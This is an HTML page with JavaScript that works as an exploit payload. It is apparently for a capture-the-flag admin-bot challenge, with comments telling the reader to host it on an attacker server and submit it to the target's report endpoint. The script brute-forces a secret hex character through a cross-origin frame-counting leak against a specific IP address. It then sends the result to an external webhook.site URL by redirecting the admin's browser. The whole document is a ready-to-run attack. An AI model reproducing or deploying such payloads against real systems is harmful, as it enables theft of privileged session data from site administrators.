<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Leakss Admin Session Exploit Payload (Path Leak)</title>
    <!-- 
        HOST THIS FILE on your attacker server (e.g., http://attacker.com/exploit.html)
        THEN submit that URL to the target's /report?url= endpoint.
    -->
    <style>
        body { background-color: #f0f0f0; color: #333; font-family: monospace; padding: 20px; }
        #status-message { font-size: 14px; color: #cc5500; }
        .log-entry { margin-bottom: 5px; }
    </style>
</head>
<body>

    <div id="status-message">Executing Admin-Session Brute Force... **Ensure this page is hosted externally.**</div>
    <div id="log-container"></div>
    
    <!-- The hidden iframe used for the cross-origin structural change detection -->
    <iframe id="targetFrame" style="display: none;"></iframe>

    <script>
        // --- EXFILTRATION CONFIGURATION ---
        // Your specific webhook URL provided by the user. 
        // NOTE: The leaked character will be appended to this URL's path.
        const WEBHOOK_BASE_URL = 'https://webhook.site/d035f84d-52a7-4f84-af02-2a47782a8150';
        
        // --- ATTACK CONFIGURATION ---
        const TARGET_BASE_URL = 'https://31.97.187.222:9999/?pass=lebah'; 
        const CHARSET = '0123456789abcdef'; // Target is one final hex digit
        const DELAY_MS = 750; // Delay for the server to process the request and for the iframe to load
        // ---------------------

        let currentCharIndex = 0;
        const targetFrame = document.getElementById('targetFrame');
        const logContainer = document.getElementById('log-container');

        function log(message) {
            const entry = document.createElement('div');
            entry.classList.add('log-entry');
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(entry);
        }

        /**
         * THE CRITICAL BYPASS: Exfiltrates data via full-page redirection 
         * using the leaked character in the URL PATH.
         */
        function exfiltrateAndStop(foundChar) {
            log(`[SUCCESS] Correct character found: ${foundChar}`);
            
            // CONSTRUCT THE FINAL URL WITH THE LEAKED CHARACTER IN THE PATH
            const exfilUrl = `${WEBHOOK_BASE_URL}/${foundChar}`;
            
            log(`[EXFILTRATION] Redirecting admin session to: ${exfilUrl}`);
            
            // This line executes the bypass: a top-level browser navigation.
            window.location.href = exfilUrl;

            // Stop the script immediately 
            throw new Error("Exploit successful, stopped execution after redirection."); 
        }

        function testNextCharacter() {
            if (currentCharIndex >= CHARSET.length) {
                log('[FINISH] Brute force complete. No match found.');
                return;
            }

            const char = CHARSET[currentCharIndex];
            const fullTargetUrl = TARGET_BASE_URL + char;

            log(`[TESTING] Character '${char}' with URL: ${fullTargetUrl}`);

            targetFrame.src = fullTargetUrl;

            setTimeout(() => {
                checkFrameState(char);
            }, DELAY_MS);
        }

        function checkFrameState(char) {
            const targetWindow = targetFrame.contentWindow;

            try {
                // Check the cross-origin frame count.
                const nestedFrameCount = targetWindow.length; 
                
                log(`[RESULT] Frame length for '${char}' is ${nestedFrameCount}.`);

                if (nestedFrameCount > 0) {
                    exfiltrateAndStop(char);
                    return; 
                }

            } catch (e) {
                // Ignore SOP errors and continue the loop
                log(`[SOP] Cross-origin access blocked or error for '${char}': ${e.name}. Continuing.`);
            }

            currentCharIndex++;
            testNextCharacter();
        }

        window.onload = function() {
            log('Payload loaded. Initiating brute force sequence...');
            testNextCharacter();
        };
    </script>
</body>
</html>
